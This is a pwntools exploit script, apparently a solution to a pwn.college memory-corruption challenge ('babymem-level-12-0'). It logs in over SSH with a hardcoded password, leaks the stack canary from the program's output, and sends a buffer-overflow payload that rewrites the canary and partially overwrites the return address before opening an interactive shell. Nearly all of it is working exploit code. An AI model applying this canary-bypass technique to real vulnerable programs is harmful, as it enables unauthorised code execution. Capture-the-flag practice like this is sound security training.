from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level='info'
FILE = "/challenge/babymem-level-12-0"
HOST = 'pwn.college'
username = 'hacker'
password = '''425192'''

port = 22

conn = ssh(user=username, host=HOST, password=password, port=port)

process = conn.process(FILE)

payload = b"REPEAT"
process.sendlineafter(b'Payload size:', str.encode(str(len(payload))))
process.recvuntil(b"- the canary value is now 0x")
addr = int(process.recvline()[:-2], 16)
log.success("addr => {}".format(hex(addr)))
process.sendline("200")
process.sendline(b"A"*104 + p64(addr) + b"A"*8 + b"\x1c\xdd")
process.interactive()
conn.close()
